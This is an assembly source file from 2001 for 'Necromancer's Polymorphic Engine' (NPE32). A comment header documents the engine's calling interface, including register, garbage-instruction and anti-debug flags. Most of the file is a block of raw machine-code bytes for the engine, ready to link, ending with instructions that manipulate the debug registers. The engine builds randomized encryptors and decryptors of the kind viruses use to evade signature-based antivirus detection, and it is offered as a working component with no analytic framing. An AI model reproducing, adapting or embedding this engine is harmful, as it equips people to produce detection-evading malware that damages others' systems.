;==============================================================================
;                       Necromancer's Polymorphic Engine
;                                    v 1.0
;                        (c) necr0mancer december 2001
;
;
;stdcall
;int NPE_main(
;               DWORD   *offset data                    //offset to data
;               DWORD   *offset bufer                   //offset of bufer(see ramarks)
;               DWORD   count_bytes                     //size of crypting data
;               DWORD   seed                            //(see remarks)
;               DWORD   flags                           //(see remarks)
;            );
;
;Output: EAX = Size of crypted data and decryptor.
;        cf  = 1 if error 
;        cf  = 0 if success
;
;Remarks:
;    Engine must run in r/w section.
;
;   *bufer : Size of bufer must be larger of really size data beakose NPE use
;            bufer for building cryptor/decryptor.
;            In real size of bufer must be about 400h*3+size of data+1
;            But I test it with many-memory allocate & can't said
;            about working npe32 with little bufer.
;
;   Flags:
;
;         bits:
;        ÚÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;        ³  0..6   ³ Using regs32                          ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  7      ³ Antidebug functions enabled           ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  8..11  ³ number of commands in using commands  ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  11..16 ³ number of commands in using garbage   ³
;        ÀÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
; 	  Regs32 (bits 0..6):
;        ÚÄÄÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄ¿
;        ³ bit ³ 0 ³ 1 ³ 2 ³ 3 ³ 4 ³ 5 ³ 6 ³
;        ÃÄÄÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄ´
;        ³ reg ³EAX³EBX³EDX³ECX³ESI³EDI³EBP³
;        ÀÄÄÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÙ
;
;   Seed:
;  	 if this parametr is not NULL then randseed generator of NPE32
;        gets a new value for inicialize.If it is NULL NPE32 use getted
;        value for any random operations.
;
;And one 'little' thing : npe32 has a bug working in multi-layer mode,
;which destroyes original data.If size of encryptors+data more than
;D00h bytes it happends.
;
;necr0mancer2001@hotmail.com
npe_main:
db 060h,0E8h,000h,000h,000h,000h,05Dh,0EBh,077h,081h,0C0h,0A1h,001h,081h,0E8h
db 0A1h,000h,081h,0F0h,0A1h,002h,0F7h,0D0h,085h,003h,0D1h,0C0h,085h,005h,0D1h
db 0C8h,085h,004h,040h,000h,045h,007h,048h,000h,045h,006h,0F7h,0D8h,085h,008h
db 087h,0C0h,082h,000h,08Bh,0C0h,082h,000h,083h,0C0h,0C9h,000h,083h,0E8h,0C9h
db 000h,090h,090h,040h,000h,0EBh,000h,080h,000h,083h,0C8h,0CDh,000h,083h,0F0h
db 0CDh,000h,00Bh,0C0h,082h,000h,023h,0C0h,082h,000h,000h,003h,002h,001h,006h
db 007h,005h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,061h,0F9h,0C3h,08Bh,04Ch,024h,030h,0E3h,006h,089h
db 08Dh,0D0h,004h,000h,000h,08Bh,054h,024h,034h,052h,083h,0E2h,07Fh,08Dh,07Dh
db 070h,08Dh,075h,04Fh,033h,0C0h,040h,06Ah,007h,059h,033h,0DBh,052h,023h,0D0h
db 074h,002h,043h,0A4h,0D1h,0E0h,05Ah,0E2h,0F4h,00Bh,0DBh,074h,0CBh,083h,0FBh
db 003h,072h,0C6h,089h,09Dh,0BBh,003h,000h,000h,058h,08Bh,0D0h,066h,081h,0E2h
db 0FFh,000h,066h,025h,000h,0FFh,0C1h,0E8h,008h,08Bh,0C8h,025h,0F0h,000h,000h
db 000h,0C1h,0E8h,004h,083h,0F8h,009h,076h,003h,06Ah,009h,058h,00Bh,0C0h,074h
db 09Bh,089h,085h,0C2h,001h,000h,000h,083h,0E1h,00Fh,083h,0F9h,00Ah,076h,003h
db 06Ah,00Ah,059h,00Bh,0C9h,074h,086h,089h,08Dh,0D1h,003h,000h,000h,08Bh,04Ch
db 024h,02Ch,089h,08Dh,0F5h,002h,000h,000h,08Bh,07Ch,024h,028h,08Bh,074h,024h
db 024h,057h,053h,051h,081h,0C7h,000h,00Ch,000h,000h,057h,0B8h,090h,000h,000h
db 000h,003h,0C8h,0F3h,0AAh,05Fh,059h,08Bh,0DFh,00Fh,0BAh,0E2h,007h,073h,017h
db 051h,056h,08Dh,0B5h,007h,005h,000h,000h,0B9h,019h,000h,000h,000h,001h,08Dh
db 0F5h,002h,000h,000h,0F3h,0A4h,05Eh,059h,0F3h,0A4h,08Dh,08Dh,0CDh,004h,000h
db 000h,058h,08Bh,0F0h,0FFh,0D1h,08Ah,054h,005h,070h,08Bh,0C6h,0FFh,0D1h,08Ah
db 074h,005h,070h,03Ah,0F2h,074h,0F4h,088h,075h,057h,056h,04Eh,04Eh,08Bh,0C6h
db 0FFh,0D1h,040h,066h,089h,085h,0FEh,002h,000h,000h,091h,058h,08Dh,075h,070h
db 08Dh,07Dh,064h,0E8h,00Eh,003h,000h,000h,05Fh,057h,033h,0C0h,0E8h,0E1h,000h
db 000h,000h,050h,0DBh,01Ch,024h,058h,06Ah,005h,058h,0E8h,03Eh,003h,000h,000h
db 040h,091h,08Bh,044h,024h,004h,005h,000h,00Ch,000h,000h,089h,045h,05Ch,051h
db 057h,00Fh,0B7h,085h,0FEh,002h,000h,000h,08Bh,0C8h,048h,08Dh,075h,064h,08Dh
db 07Eh,006h,08Bh,0DFh,0E8h,0D1h,002h,000h,000h,05Fh,087h,0F3h,0ACh,08Ah,0F0h
db 056h,033h,0C0h,0B0h,0FFh,0BBh,000h,000h,000h,000h,08Dh,075h,003h,0E8h,013h
db 002h,000h,000h,08Dh,075h,05Ch,087h,026h,08Ah,0E6h,050h,08Bh,045h,060h,050h
db 087h,026h,05Eh,0E2h,0DAh,059h,0E2h,0BBh,033h,0C0h,0E8h,047h,001h,000h,000h
db 05Eh,060h,0FFh,0D6h,061h,05Fh,057h,08Bh,0DFh,081h,0C3h,000h,00Ch,000h,000h
db 056h,053h,0B0h,001h,0E8h,062h,000h,000h,000h,0E8h,0A7h,001h,000h,000h,08Dh
db 075h,05Ch,087h,026h,058h,089h,045h,060h,058h,08Bh,0DCh,087h,026h,08Bh,00Ch
db 024h,03Bh,0D9h,077h,00Eh,08Ah,0F4h,0B4h,000h,08Dh,075h,003h,0E8h,0BAh,001h
db 000h,000h,0EBh,0D8h,0B0h,001h,0E8h,000h,001h,000h,000h,08Bh,0DFh,05Eh,00Fh
db 0B7h,085h,0FEh,002h,000h,000h,0B9h,000h,000h,000h,000h,066h,0F7h,0E1h,091h
db 0F3h,0A5h,058h,02Bh,0F8h,089h,07Ch,024h,01Ch,0BFh,000h,000h,000h,000h,08Bh
db 045h,058h,050h,0DBh,01Ch,024h,059h,02Bh,0D9h,003h,0C3h,0ABh,0F8h,061h,0C2h
db 014h,000h,08Bh,0F7h,0FEh,0C8h,075h,008h,08Dh,08Dh,0ADh,003h,000h,000h,0EBh
db 006h,08Dh,08Dh,0E0h,003h,000h,000h,033h,0C0h,048h,0E8h,04Eh,002h,000h,000h
db 089h,045h,058h,0FFh,0D1h,057h,0DBh,004h,024h,058h,0B0h,0E8h,0AAh,033h,0C0h
db 0ABh,0FFh,0D1h,052h,08Bh,085h,0BBh,003h,000h,000h,0E8h,030h,002h,000h,000h
db 08Ah,074h,005h,070h,080h,0FEh,000h,074h,0ECh,0B0h,058h,00Ah,0C6h,0AAh,0FFh
db 0D1h,066h,0B8h,081h,0E8h,00Ah,0E6h,066h,0ABh,08Bh,045h,058h,083h,0C0h,005h
db 0ABh,0FFh,0D1h,051h,066h,0B8h,08Dh,080h,00Ah,0E6h,08Ah,075h,057h,08Ah,0D6h
db 0C0h,0E6h,003h,00Ah,0E6h,066h,0ABh,08Bh,045h,058h,02Bh,0DEh,003h,0C3h,089h
db 0BDh,04Dh,002h,000h,000h,0ABh,059h,0FFh,0D1h,066h,0B8h,087h,0E0h,00Ah,0E2h
db 066h,0ABh,05Ah,0FFh,0D1h,0B0h,0B8h,00Ah,0C2h,0AAh,052h,051h,0B8h,000h,000h
db 000h,000h,099h,033h,0C9h,066h,0B9h,000h,000h,0C1h,0E1h,002h,066h,0F7h,0F1h
db 040h,089h,085h,03Bh,002h,000h,000h,0ABh,059h,0FFh,0D1h,08Bh,0C7h,040h,089h
db 085h,07Bh,003h,000h,000h,087h,0CAh,00Fh,0B6h,08Dh,0FEh,002h,000h,000h,08Dh
db 075h,064h,0ACh,00Ch,058h,0AAh,0FFh,0D2h,0E2h,0F8h,05Ah,0C3h,053h,050h,0FEh
db 0C8h,075h,008h,08Dh,09Dh,0ADh,003h,000h,000h,0EBh,006h,08Dh,09Dh,0E0h,003h
db 000h,000h,0FFh,0D3h,00Fh,0B6h,08Dh,0FEh,002h,000h,000h,051h,08Dh,075h,064h
db 003h,0F1h,04Eh,0FDh,0ACh,0FCh,00Ch,050h,0AAh,0FFh,0D3h,0E2h,0F6h,066h,0B8h
db 081h,0C4h,066h,0ABh,058h,0C1h,0E0h,002h,0ABh,0FFh,0D3h,066h,0B8h,048h,074h
db 00Ah,0C2h,066h,0ABh,057h,0AAh,0FFh,0D3h,0B0h,0E9h,0AAh,0BEh,000h,000h,000h
db 000h,08Bh,0C7h,083h,0C0h,005h,02Bh,0C6h,0F7h,0D8h,0ABh,0FFh,0D3h,087h,0FEh
db 05Fh,08Bh,0C6h,02Bh,0C7h,048h,0AAh,087h,0FEh,0FFh,0D3h,066h,0B8h,087h,0E0h
db 00Ah,065h,057h,066h,0ABh,0FFh,0D3h,058h,0FEh,0C8h,074h,003h,0B0h,0C3h,0AAh
db 05Bh,0C3h,060h,0B8h,006h,000h,000h,000h,0E8h,015h,001h,000h,000h,040h,091h
db 0B8h,000h,000h,000h,000h,0E8h,009h,001h,000h,000h,08Ah,074h,005h,070h,0B8h
db 0FFh,000h,000h,000h,08Dh,075h,027h,0BBh,000h,000h,000h,000h,0E8h,007h,000h
db 000h,000h,0E2h,0DEh,089h,03Ch,024h,061h,0C3h,060h,03Ch,0FFh,074h,016h,0C6h
db 045h,056h,001h,08Dh,004h,086h,00Fh,0B6h,058h,003h,08Dh,004h,09Eh,08Ah,050h
db 002h,066h,08Bh,000h,0EBh,017h,0C6h,045h,056h,000h,093h,0E8h,0C7h,000h,000h
db 000h,089h,044h,024h,01Ch,08Dh,004h,086h,08Ah,050h,002h,066h,08Bh,000h,08Ah
db 0EAh,080h,0FEh,000h,075h,006h,00Fh,0BAh,0E2h,002h,073h,062h,080h,0E2h,003h
db 00Ah,0D2h,074h,013h,0FEh,0CAh,074h,007h,08Ah,0D6h,0C0h,0E2h,003h,00Ah,0E2h
db 00Ah,0E4h,075h,002h,00Ah,0C6h,00Ah,0E6h,08Ah,0D5h,080h,0E2h,0C0h,0C0h,0EAh
db 006h,0FEh,0CAh,075h,003h,0AAh,0EBh,002h,066h,0ABh,08Ah,0D5h,080h,0E2h,038h
db 0C0h,0EAh,003h,0FEh,04Dh,056h,074h,00Dh,033h,0C0h,048h,0E8h,06Dh,000h,000h
db 000h,089h,045h,060h,0EBh,003h,08Bh,045h,060h,080h,0FAh,004h,074h,00Bh,080h
db 0FAh,002h,074h,009h,0FEh,0CAh,074h,009h,0EBh,00Ah,0ABh,0EBh,007h,066h,0ABh
db 0EBh,003h,033h,0C0h,0AAh,089h,03Ch,024h,061h,0C3h,060h,049h,074h,02Bh,050h
db 058h,050h,0E8h,03Ah,000h,000h,000h,08Ah,004h,006h,03Ah,0C2h,074h,0F2h,03Ah
db 045h,057h,074h,0EDh,0AAh,086h,0E0h,05Bh,0ACh,03Ah,0C2h,074h,0FBh,03Ah,045h
db 057h,074h,0F6h,03Ah,0C4h,074h,0F2h,0AAh,0E2h,0EFh,061h,0C3h,093h,08Bh,0C3h
db 0E8h,00Fh,000h,000h,000h,08Ah,004h,006h,03Ah,0C2h,074h,0F2h,03Ah,045h,057h
db 074h,0EDh,0AAh,061h,0C3h,060h,050h,0B8h,078h,056h,034h,012h,0BFh,005h,084h
db 008h,008h,0F7h,0E7h,040h,089h,085h,0D0h,004h,000h,000h,033h,0D2h,059h,00Bh
db 0C9h,074h,006h,0F7h,0F1h,089h,054h,024h,01Ch,061h,0C3h,04Eh,050h,045h,033h
db 032h,05Bh,031h,033h,031h,038h,05Dh,06Eh,065h,063h,072h,030h,06Dh,061h,06Eh
db 063h,065h,072h,057h,00Fh,001h,04Ch,024h,0FEh,05Fh,089h,047h,008h,089h,047h
db 018h,00Fh,023h,0C0h,00Fh,023h,0C8h,00Fh,023h,0D0h,00Fh,023h,0D8h 